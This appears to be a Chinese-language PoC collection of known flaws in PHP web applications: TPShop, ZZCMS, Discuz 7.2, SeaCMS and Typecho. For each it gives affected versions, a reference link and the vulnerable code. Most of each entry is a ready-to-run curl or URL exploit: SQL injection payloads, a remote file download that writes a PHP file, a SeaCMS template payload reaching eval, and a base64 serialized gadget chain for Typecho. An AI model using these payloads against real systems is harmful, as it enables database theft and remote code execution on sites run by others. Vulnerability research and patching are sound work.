## SQL 注入

### topshop v2.0.8 报错注入

影响版本

* 2.0.8

参考链接

* [【PHP代码审计】TPShop漏洞集合](https://mp.weixin.qq.com/s/TNuM8q8JZsFR_46j5LemMw)

Poc

```
http://127.0.0.1/index.php/Home/Goods/goodsList/id/1/sort/shop_price/sort_asc/,(updatexml(2,concat(0x7e,(version())),0))
```

关键代码

```
# 获取参数
$sort_asc = I('get.sort_asc','asc');

...

# 注入
$goods_list = M('goods')->where(['is_on_sale' => 1, 'goods_id' => ['in', implode(',', $filter_goods_id)]])->order("$sort $sort_asc")->limit($page->firstRow . ',' . $page->listRows)->select();
```

### zzcms v8.2 无回显注入

影响版本

* 8.2

参考链接

* [ZZCMS v8.2 最新版SQL注入漏洞](http://www.freebuf.com/vuls/161888.html)

Poc

```
curl '127.0.0.1/user/del.php' -d 'id=1&tablename=zzcms_answer union select 1, sleep(5)%23'
```

关键代码

```
# 获取表名后，使用 switch/case 去分别处理
$tablename=trim($_POST["tablename"]);

...

# 在默认分支，拼接了这个参数导致注入
$sql="select id,editor from ".$tablename." where id ='$id'";
```

### discuz v7.2 faq.php 注入

影响版本 

* <= 7.2

参考链接

* [Discuz!7.2 faq.php文件SQL注入漏洞分析及利用实战](http://blog.51cto.com/simeon/1440000)

Poc

```
curl -g '127.0.0.1/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28user%28%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23'
```

## RCE

### topshop v2.0.8 远程文件下载

影响版本

* 2.0.8

参考链接

* [【PHP代码审计】TPShop漏洞集合](https://mp.weixin.qq.com/s/TNuM8q8JZsFR_46j5LemMw)

Poc

```
curl 'http://127.0.0.1/index.php/Home/test/dlfile' -d 'file_url=http://127.0.0.1/robots.txt&save_to=/var/www/html/robots.php'
curl 127.0.0.1/robots.php
```

### seacms 代码执行漏洞

影响版本

* 6.45

参考链接

* [漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警](http://www.freebuf.com/vuls/150042.html)

Poc

```
curl 127.0.0.1/search.php -d 'searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo();'
```

关键代码

```
# payload 放在 IF 条件里，导致代码执行
@eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
```

### typecho 反序列化漏洞

影响版本

* v1.1-15.5.12-beta

参考链接

* [Typecho install.php存在的反序列化漏洞分析（含EXP）](http://www.freebuf.com/vuls/155753.html)

Poc

```
curl 127.0.0.1/install.php?finish=1 --data '__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUxMTc5NTIwMTtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30%3d' -H 'Referer: http://127.0.0.1/install.php'
```

关键代码

```
# 直接反序列化用户输入
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
```

